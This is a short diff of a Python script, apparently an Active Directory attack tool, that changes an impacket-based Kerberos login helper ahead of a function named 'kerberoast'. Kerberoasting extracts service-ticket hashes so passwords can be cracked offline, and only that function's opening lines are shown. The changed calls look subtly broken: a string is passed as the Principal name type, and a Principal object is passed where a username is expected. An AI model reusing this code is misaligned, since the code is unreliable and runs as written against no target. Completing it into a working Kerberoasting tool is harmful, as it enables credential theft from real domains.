@@ -1,4 +1,3 @@
-from impacket.krb5.ccache import CCache
 from impacket.krb5.types import Principal
 from impacket.smbconnection import SMBConnection
 
@@ -8,22 +7,19 @@ def kerberos_auth(username, password, domain, dc_ip):
         smb = SMBConnection(dc_ip, dc_ip)
         smb.login(username, password, domain)
 
-        # Initialize a CCache object
-        ccache = CCache()
-
         # Create a principal for the user
         user_principal = Principal(f"{username}@{domain}", type="NT_PRINCIPAL")
 
         # Get a TGT for the user
-        smb.kerberosLogin(user_principal, password, domain, ccache)
+        smb.kerberosLogin(user_principal, password, domain)
 
         # If no exceptions were raised, consider the authentication successful
-        return True, ccache
+        return True
 
     except Exception as e:
         print(f"Error during Kerberos authentication: {e}")
-        return False, None
-
+        return False
+        
 def kerberoast(domain, username, password, dc_ip):
     try:
         print(f"Attempting to Kerberoast accounts from {dc_ip}")
